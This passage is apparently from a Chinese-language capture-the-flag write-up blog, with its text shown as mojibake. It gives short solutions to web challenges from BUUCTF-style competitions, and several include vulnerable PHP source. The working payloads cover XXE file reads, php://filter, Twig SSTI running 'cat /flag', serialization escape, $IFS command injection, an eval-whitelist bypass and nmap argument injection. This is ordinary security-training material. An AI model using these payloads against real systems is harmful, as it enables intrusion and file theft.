class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY admin SYSTEM <span class="string">&quot;file:///flag&quot;</span> &gt;]&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>dwad<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>php://çš„ä¸€ä¸ªtrickï¼Œdwadé‚£ä¸€å—å¯ä»¥ä»»æ„å¡«å†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?category=php://filter/read=convert.base64-encode/woofers/dwad%20aw/resource=flag</span><br></pre></td></tr></table></figure><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>è¿™ä¸ªè€å®è¯´ï¼Œæ˜¯è‡ªå·±çŸ¥è¯†é¢ä¸å¤Ÿäº†ï¼Œæ‰çŸ¥é“åœ¨æŸç§æƒ…å†µä¸‹unicodeå­—ç¬¦ä¼šè·Ÿæ•°å­—æœ‰ä¸ªç­‰ä»·æ€§</p><p><a href="https://www.compart.com/en/unicode/U+2187">https://www.compart.com/en/unicode/U+2187</a></p><p>è¿™ä¸ªå­—ç¬¦å¤§äºéœ€è¦ä¹°çš„ä¸œè¥¿çš„ä»·æ ¼ï¼Œå‘åŒ…çš„æ—¶å€™å‚æ•°ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=4&amp;price=%E2%86%87</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>æ ¹æ®é¢˜ç›®å‘ç°cookieä¸­çš„å†…å®¹è¾“å‡ºåœ¨é¡µé¢ä¸Šï¼Œå°è¯•sstiï¼Œ63ï¼Œé¡µé¢è¾“å‡º63ï¼Œçš„ç¡®å­˜åœ¨ã€‚</p><p>phpä¸­çš„sstiæœ€å¸¸è§çš„å¯¹åº”çš„æ˜¯twigå¼•æ“ï¼Œæœ‰<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">ä¸€ç¯‡æ–‡ç« </a>å†™çš„å¾ˆå¥½ï¼ŒæŠŠæ‰€æœ‰sstiéƒ½è®²äº†ä¸€é</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–é€ƒé€¸å­—ç¬¦ä¸²ï¼Œç„¶åæ›¿æ¢æ‰imgçš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post:_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class="line"></span><br><span class="line">post:_SESSION[fl1gfl1g]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>robots.txt -&gt; fakeflag -&gt; headerå¤´é‡Œå‘ç°ä¸Šè¿°æ–‡ä»¶</p><p>payload:<code>fl4g.php?num=2e9&amp;md5=0e215962017&amp;get_flag=ca\t$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p><h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload: <code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</code></p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p>ä¸»è¦æ˜¯éœ€è¦ç»†å¿ƒï¼Œä¿®æ”¹ç»“æœè¯¦æƒ…å‚æ•°få†…å®¹ï¼Œç»“åˆæŠ¥é”™æ‰¾åˆ°xmlæ–‡ä»¶ä½ç½®ï¼Œé€šè¿‡xmlæ–‡ä»¶ä¸­nmapè¯­å¥è¿›è¡Œæ„é€ payloadã€‚</p><p>ä½†è¿™é‡Œæœ‰ä¸¤ä¸ªå‡½æ•°escapeshellargå’Œescapeshellcmdï¼Œå‰è€…å°†å­—ç¬¦ä¸²è½¬ç ä¸ºshellå‘½ä»¤ä¸­çš„å‚æ•°ï¼Œåè€…åˆ™æ˜¯å¯¹shellå…ƒå­—ç¬¦è¿›è¡Œè½¬ä¹‰</p><p>Payload: <code>127.0.0.1&#39; -iL /flag -o haha</code></p><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>); <span class="comment">//å¯ä»¥è¯»flag</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; <span class="comment">//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; <span class="comment">//å¦‚æœæ˜¯å¯¹è±¡ï¼Œæ‰“å°å¯¹è±¡å†…å®¹</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; <span class="comment">//è®¿é—®ä¸å­˜åœ¨çš„å±æ€§æˆ–æ˜¯å—é™çš„å±æ€§æ—¶è°ƒç”¨</span></span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if(isset($_GET[&#x27;pop&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">//     @unserialize($_GET[&#x27;pop&#x27;]);</span></span><br><span class="line"><span class="comment">// 